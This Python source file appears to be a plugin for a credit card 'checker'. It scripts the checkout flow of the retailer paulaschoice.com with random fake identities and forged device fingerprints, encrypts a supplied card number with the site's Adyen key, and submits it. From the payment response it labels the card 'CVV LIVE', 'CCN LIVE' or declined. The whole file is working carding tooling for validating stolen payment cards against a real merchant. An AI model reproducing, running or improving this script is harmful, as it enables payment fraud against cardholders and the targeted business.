import random
import requests
import urllib
import base64
from py_adyen_encrypt import encryptor

from mills.plugins.checkers.funcs.rand_user import random_user_api
from mills.plugins._helpers.tools import find_between

def adyen_enc(cc, mes, ano, cvv, ADYEN_KEY, adyen_version):
    enc = encryptor(ADYEN_KEY)
    enc.adyen_version = adyen_version
    enc.adyen_public_key = ADYEN_KEY

    card = enc.encrypt_card(card=cc, cvv=cvv, month=mes, year=ano)
    month = card['month']
    year = card['year']
    cvv = card['cvv']
    card = card['card']

    # card = urllib.parse.quote_plus(card)
    # Month = urllib.parse.quote_plus(month)
    # Year = urllib.parse.quote_plus(year)
    # cvv = urllib.parse.quote_plus(cvv)
    return card, month, year,cvv


def get_random_string(length):
        letters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
        result_str = ''.join(random.choice(letters) for i in range(length))
        return result_str

def adyen(cc, mes, ano, cvv):
    r = requests.Session()
    rand_user = random_user_api().get_random_user_info()
    a = r.get('https://www.paulaschoice.com/c15-super-booster/777.html')
    csrf = a.cookies.get('sid') + '='
    if not csrf:
        return 
    
    b_data = {    "csrfToken": csrf,
}
    b = r.post('https://www.paulaschoice.com/on/demandware.store/Sites-paulaschoice_us-Site/en_US/Bag-Get', json = b_data)

    if not b  or not b.json()['success']:
        return


    c = r.get('https://www.paulaschoice.com/cart?ajax=true')
    if not c: return
    d_data = {
    "csrfToken": csrf,
    "stepNumber": 1,
    "stepName": "cart"
}

    d = r.post('https://www.paulaschoice.com/on/demandware.store/Sites-paulaschoice_us-Site/en_US/App-ReportCheckoutStep', json = d_data)

    if not d  or not d.json()['success']:
        return

    e_data = {
    "csrfToken": csrf,
    "stepNumber": 2,
    "stepName": "login"
}

    e = r.post('https://www.paulaschoice.com/on/demandware.store/Sites-paulaschoice_us-Site/en_US/App-ReportCheckoutStep', json = e_data)

    if not e  or not e.json()['success']:
        return

    f_data = {
    "csrfToken": csrf,
    "stepNumber": 3,
    "stepName": "shipping"
}

    f = r.post('https://www.paulaschoice.com/on/demandware.store/Sites-paulaschoice_us-Site/en_US/App-ReportCheckoutStep', json = f_data)

    if not f  or not f.json()['success']:
        return


    g_data = {
    "csrfToken": csrf,
    "verified": False,
    "address": {
        "firstName": rand_user.first_name,
        "lastName": rand_user.last_name,
        "companyName": "",
        "line1": "3 allen street",
        "line2": "",
        "city": "new york",
        "state": "NY",
        "postalCode": "10002",
        "country": "US",
        "phone": rand_user.phone
    },
    "email": rand_user.email,
    "subscribeEmail": False,
    "makeDefaultAddress": False
}


    g = r.post('https://www.paulaschoice.com/on/demandware.store/Sites-paulaschoice_us-Site/en_US/Checkout-SetShippingInfo', json = g_data)

    if not g: return
    
    h_data  = {
    "csrfToken": csrf,
    "stepNumber": 4,
    "stepName": "billing"
}

    h = r.post('https://www.paulaschoice.com/on/demandware.store/Sites-paulaschoice_us-Site/en_US/App-ReportCheckoutStep', json = h_data)

    if not h  or not h.json()['success']:
        return

    card,month,year,cvc = adyen_enc(cc,mes,ano,cvv, "10001|9CE26940D618A696ABC7DB16C3B739ADEF0BA2C707575E375FB07C2398E8F8B9E363C78CCC3A20EAA8548476F06D81DBBB87588D20EBCFB5CD062058C6933D0D6A5DDE7147AA2076A20EC5EB78FFE7BC5FD7709D7C5E198BDF68A1CA2599A02452FD75FD8590097B449A725A7D20E02A3346904D9D95D5885EC8F10FD40453EF8C26E56DE24BE7B1928793A0D3F0D27D4096F82441334B23E7E991A0BC31DED5CE1A658C07CD7108DDDA8A35003CB471F6B7F486DF1EC22900987B037D385F89D8FC6F2828FDA776BC6FB8D5A2ACCC282ADBAD962B9F356AF869CE6ED65D3D711BA115CAC30F174789485E977B57324E94956702289D7B2778CC300D117D28F3", "_0_1_25")

    enc =  {"version":"1.0.0","deviceFingerprint":f"{get_random_string(124)}:40","persistentCookie":[]}
    encoded_dict = str(enc).encode('utf-8')
    base64_dict = base64.b64encode(encoded_dict).decode('utf-8')
    j_data = {
    "csrfToken": csrf,
    "opaqueData": {
        "riskData": {
            "clientData":base64_dict
        },
        "paymentMethod": {
            "type": "scheme",
            "encryptedExpiryMonth": month,
            "encryptedExpiryYear": year,
            "encryptedSecurityCode": cvc,
            "encryptedCardNumber": card
        },
        "browserInfo": {
            "acceptHeader": "*/*",
            "colorDepth": 24,
            "language": "en-IN",
            "javaEnabled": False,
            "screenHeight": 768,
            "screenWidth": 1360,
            "userAgent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36",
            "timeZoneOffset": -330
        },
        "clientStateDataIndicator": True
    },
    "address": {
        "line1": "3 allen street",
        "line2": "",
        "city": "new york",
        "companyName": "",
        "firstName": rand_user.first_name,
        "lastName": rand_user.last_name,
        "phone": rand_user.phone,
        "postalCode": "10002",
        "state": "NY",
        "country": "US"
    },
    "makeDefaultCard": True
}

    j = r.post('https://www.paulaschoice.com/on/demandware.store/Sites-paulaschoice_us-Site/en_US/Checkout-SetCardInfo', json=j_data)

    if j and j.json()['success']:
        return "Chaged $56", "✅", 'CVV LIVE'
    elif not j and 'errorMessage' in j.json() or 'message' in j.json():
        message= j.json()['errorMessage'] if 'errorMessage' in j.json() else j.json()['message']
        if "CVC Declined" in message:
            r_text, r_logo, r_respo = "CVC DECLINED", "✅", 'CCN LIVE'
        elif "Not enough balance" in message:
            r_text, r_logo, r_respo = "LOW FUNDS", "✅", 'CVV LIVE'      
        elif "AVS Declined" in message:
            r_text, r_logo, r_respo = "AVS DECLINED", "✅", 'CVV LIVE'
        else:
            r_text, r_logo, r_respo = "DECLINED" , "❌", 'DECLINED'
        return r_text if not message else message,r_logo,r_respo
    else:
        message= j.json()['errorMessage'] if 'errorMessage' in j.json() else j.json()['message']
        return message, "❌", 'DECLINED' 
